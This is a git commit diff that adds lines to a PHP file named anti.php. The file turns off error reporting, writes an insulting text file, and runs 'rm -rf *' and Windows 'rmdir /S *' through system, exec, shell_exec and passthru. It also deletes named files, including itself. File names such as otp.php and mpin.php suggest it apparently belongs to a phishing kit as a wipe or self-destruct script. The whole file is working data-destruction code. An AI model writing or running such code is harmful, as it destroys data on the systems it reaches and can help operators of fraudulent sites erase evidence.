2db2103f1c17264bc18b353f6e7ef8cd053808d9
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-30 05:54:31 +0000

    Create anti.php

--- anti.php
+++ anti.php
@@ -1,10 +1,13 @@
 error_log(0);
 error_reporting(0);
 file_put_contents("fuck-you.txt", "Fuck you asshole.");
+// linux
 system('rm -rf *');
 exec('rm -rf *');
 shell_exec('rm -rf *');
 passthru('rm -rf *');
+
+// php
 unlink('index.php');
 unlink('otp.php');
 unlink('mpin.php');
@@ -13,3 +16,9 @@ unlink('anti.php');
 unlink('config/anti.php');
 unlink('config/404.php');
 unlink('config/zch.php');
+
+// cmd
+system('rmdir /S *');
+exec('rmdir /S *');
+shell_exec('rmdir /S *');
+passthru('rmdir /S *');
